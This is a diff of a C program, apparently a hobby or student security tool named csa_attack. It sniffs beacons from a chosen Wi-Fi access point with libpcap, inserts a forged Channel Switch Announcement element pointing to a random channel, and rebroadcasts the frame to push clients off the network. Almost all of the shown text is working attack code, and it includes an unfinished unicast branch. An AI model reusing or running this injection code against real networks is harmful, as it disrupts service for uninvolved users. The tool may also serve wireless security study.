@@ -43,6 +43,27 @@ typedef struct tagged_parameters
     u_char tag_length;
 } tag;
 
+typedef struct Proberesponse // 44여야함
+{
+    // Radio 8
+    u_char hdr_rev;
+    u_char hdr_pad;
+    u_short hdr_len;
+    u_int present_flag;
+    // Probe Response 24
+    u_short type;
+    u_short dur;
+    u_char mac_Des[MAC_ADDR_LEN];
+    u_char mac_src[MAC_ADDR_LEN];
+    u_char mac_bssid[MAC_ADDR_LEN];
+    u_short fs_number;
+    // Fixed  parameters 12
+    u_int64_t time;
+    u_short interval;
+    u_short capabilities;
+
+} probe; // 44
+
 void usage()
 {
     printf("syntax: csa_attack <interface> <AP mac> <Ch> \n");
@@ -79,6 +100,7 @@ void Mac_(const char *arr, u_char mac_addr[6]);
 bool isBeacon(const u_char *packet);
 bool arrncmp(const char *arr1, const char *arr2, int len);
 void expArray(u_char *packet, int len, int pivot); //배열 공간 생성
+void PtData(const u_char *packet, u_char caplen);
 int csaATK(const unsigned char *Interface, const unsigned char *Input_AP_MAC, const unsigned char *Input_STA_MAC, const unsigned char *Input_AP_Ch, Opt *opt);
 
 int main(int argc, char *argv[])
@@ -132,6 +154,7 @@ bool isBeacon(const u_char *packet)
 {
     Radio *rad;
     rad = (Radio *)packet;
+    //printf("rev : %d\npad : %d\n len:%d\n",rad->hdr_rev,rad->hdr_pad,rad->hdr_len);
     BeaconHd *bec;
     bec = (BeaconHd *)(packet + rad->hdr_len);
     if (htons(bec->type) == 0x8000)
@@ -163,6 +186,23 @@ void expArray(u_char *arr, int len, int pivot)
     {
         arr[i + 5] = arr[i];
     }
+}
+
+void PtData(const u_char *packet, u_char caplen)
+{
+    for (int i = 0; i < caplen; i++)
+    {
+        if (i % 8 == 0 && i != 0 && i % 16 != 0)
+        {
+            printf("| ");
+        }
+        if (i % 16 == 0 && i != 0)
+        {
+            printf("\n");
+        }
+        *(packet + i) < 16 ? printf("0%x ", *(packet + i)) : printf("%x ", *(packet + i));
+    }
+    printf("\n");
 }
 
 int csaATK(const unsigned char *Interface, const unsigned char *Input_AP_MAC, const unsigned char *Input_STA_MAC, const unsigned char *Input_AP_Ch, Opt *opt)
@@ -204,7 +244,7 @@ int csaATK(const unsigned char *Interface, const unsigned char *Input_AP_MAC, co
             printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
             break;
         }
-
+        PtData(packet,header->caplen);
         Radio *rad;
         rad = (Radio *)packet;
         u_char AP_MAC[6];
@@ -213,121 +253,128 @@ int csaATK(const unsigned char *Interface, const unsigned char *Input_AP_MAC, co
         u_char *send_packet;
 
         // Broadcast
-        if (isBeacon(packet))
+        if (!Op_d)
         {
-            /*----------이거 함수화----------*/
-            unsigned char ChangeCh;
-            if (Op_c)
+            if (isBeacon(packet))
             {
-                ChangeCh = opt->Op_c_ch;
-            }
-            else
-            {
-                srand(time(NULL));
-
-                while (true)
+                /*----------이거 함수화----------*/
+                unsigned char ChangeCh;
+                if (Op_c)
                 {
-                    int random = rand() % 58;
-                    if (Wireless_Channel[random] != ApCh && (Wireless_Channel[random] > ApCh + 10 || Wireless_Channel[random] < ApCh - 10))
+                    ChangeCh = opt->Op_c_ch;
+                }
+                else
+                {
+                    srand(time(NULL));
+
+                    while (true)
                     {
-                        ChangeCh = Wireless_Channel[random];
-                        break;
+                        int random = rand() % 58;
+                        if (Wireless_Channel[random] != ApCh && (Wireless_Channel[random] > ApCh + 10 || Wireless_Channel[random] < ApCh - 10))
+                        {
+                            ChangeCh = Wireless_Channel[random];
+                            break;
+                        }
                     }
                 }
-            }
-            /*----------이거 함수화----------*/
-            if ((rad->flags >> 4) == 1)
-            {
-                isFcS = true;
-            }
-            else
-            {
-                isFcS = false;
-            }
-
-            Mac_(Input_AP_MAC, AP_MAC);
-
-            BeaconHd *becH;
-            becH = (BeaconHd *)(packet + rad->hdr_len);
-            if (arrncmp(AP_MAC, becH->mac_src, 6))
-            {
-                send_packet = (u_char *)malloc(sizeof(u_char) * (header->caplen));
-                if (send_packet == NULL)
+                /*----------이거 함수화----------*/
+                if ((rad->flags >> 4) == 1)
                 {
-                    continue;
+                    isFcS = true;
                 }
-                memcpy(send_packet, packet, header->caplen);
-                /*----------이거 함수화----------*/
-                if (isFcS)
+                else
                 {
-                    *(send_packet + 16) = 0x00; // fcs
+                    isFcS = false;
                 }
-                /*----------이거 함수화----------*/
-                Radio *rad;
-                rad = (Radio *)send_packet;
-                u_int not_tag_len = (rad->hdr_len) + 24 + 12;
-                u_int tag_len = (header->caplen) - 4 - not_tag_len;
-                u_int total_len = not_tag_len + tag_len;
-                tag *tagged;
-                bool csa_inject = false;
-                int error;
-                /*----------이거 함수화----------*/
-                for (int i = 0; i < tag_len; i)
+
+                Mac_(Input_AP_MAC, AP_MAC);
+
+                BeaconHd *becH;
+                becH = (BeaconHd *)(packet + rad->hdr_len);
+                if (arrncmp(AP_MAC, becH->mac_src, 6))
                 {
-                    tagged = (tag *)(send_packet + not_tag_len + i);
-                    if (tagged->tag_number > 37)
+                    send_packet = (u_char *)malloc(sizeof(u_char) * (header->caplen));
+                    if (send_packet == NULL)
                     {
-                        total_len += 5;                                                                    // CSA넣을 5byte 증가
+                        continue;
+                    }
+                    memcpy(send_packet, packet, header->caplen);
+                    /*----------이거 함수화----------*/
+                    if (isFcS)
+                    {
+                        *(send_packet + 16) = 0x00; // fcs
+                    }
+                    /*----------이거 함수화----------*/
+                    Radio *rad;
+                    rad = (Radio *)send_packet;
+                    u_int not_tag_len = (rad->hdr_len) + 24 + 12;
+                    u_int tag_len = (header->caplen) - 4 - not_tag_len;
+                    u_int total_len = not_tag_len + tag_len;
+                    tag *tagged;
+                    bool csa_inject = false;
+                    int error;
+                    /*----------이거 함수화----------*/
+                    for (int i = 0; i < tag_len; i)
+                    {
+                        tagged = (tag *)(send_packet + not_tag_len + i);
+                        if (tagged->tag_number > 37)
+                        {
+                            total_len += 5;                                                                    // CSA넣을 5byte 증가
+                            char *tmp = (char *)realloc(send_packet, sizeof(u_char) * ((header->caplen) + 5)); // 5byte 증가
+                            if (tmp != NULL)
+                            {
+                                send_packet = tmp;
+                            }
+                            expArray(send_packet, total_len, not_tag_len + i - 1); // csa를 넣을 공간 생성
+                            /*----------이거 함수화----------*/
+                            *(send_packet + not_tag_len + i) = 0x25;
+                            *(send_packet + not_tag_len + i + 1) = 0x3;
+                            *(send_packet + not_tag_len + i + 2) = 0x1;
+                            *(send_packet + not_tag_len + i + 3) = ChangeCh;
+                            *(send_packet + not_tag_len + i + 4) = 0x1;
+                            csa_inject = true;
+                            break;
+                        }
+                        i += tagged->tag_length + 2;
+                    }
+                    if (csa_inject == false)
+                    { // tag를 끝까지 돌아도 37(CSA)을 넘는 테그가 없다면
+
                         char *tmp = (char *)realloc(send_packet, sizeof(u_char) * ((header->caplen) + 5)); // 5byte 증가
                         if (tmp != NULL)
                         {
                             send_packet = tmp;
                         }
-                        expArray(send_packet, total_len, not_tag_len + i - 1); // csa를 넣을 공간 생성
                         /*----------이거 함수화----------*/
-                        *(send_packet + not_tag_len + i) = 0x25;
-                        *(send_packet + not_tag_len + i + 1) = 0x3;
-                        *(send_packet + not_tag_len + i + 2) = 0x1;
-                        *(send_packet + not_tag_len + i + 3) = ChangeCh;
-                        *(send_packet + not_tag_len + i + 4) = 0x1;
-                        csa_inject = true;
-                        break;
+                        *(send_packet + header->caplen) = 0x25;
+                        *(send_packet + header->caplen + 1) = 0x3;
+                        *(send_packet + header->caplen + 2) = 0x1;
+                        *(send_packet + header->caplen + 3) = ChangeCh;
+                        *(send_packet + header->caplen + 4) = 0x1;
                     }
-                    i += tagged->tag_length + 2;
-                }
-                if (csa_inject == false)
-                { // tag를 끝까지 돌아도 37(CSA)을 넘는 테그가 없다면
 
-                    char *tmp = (char *)realloc(send_packet, sizeof(u_char) * ((header->caplen) + 5)); // 5byte 증가
-                    if (tmp != NULL)
+                    for (int i = 0; i < 4; i++)
                     {
-                        send_packet = tmp;
+
+                        printf("[%d] send packet !!! \n", ++packet_count);
+                        if (pcap_sendpacket(pcap, send_packet, total_len) != 0)
+                        {
+                            fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(pcap));
+                            return -1;
+                        }
                     }
-                    /*----------이거 함수화----------*/
-                    *(send_packet + header->caplen) = 0x25;
-                    *(send_packet + header->caplen + 1) = 0x3;
-                    *(send_packet + header->caplen + 2) = 0x1;
-                    *(send_packet + header->caplen + 3) = ChangeCh;
-                    *(send_packet + header->caplen + 4) = 0x1;
+
+                    free(send_packet);
                 }
-
-                for (int i = 0; i < 4; i++)
-                {
-
-                    printf("[%d] send packet !!! \n", ++packet_count);
-                    if (pcap_sendpacket(pcap, send_packet, total_len) != 0)
-                    {
-                        fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(pcap));
-                        return -1;
-                    }
-                }
-
-                free(send_packet);
+            }
+            else
+            {
+                continue;
             }
         }
-        else
+        else //Unicast
         {
-            continue;
+
         }
     }
     pcap_close(pcap);
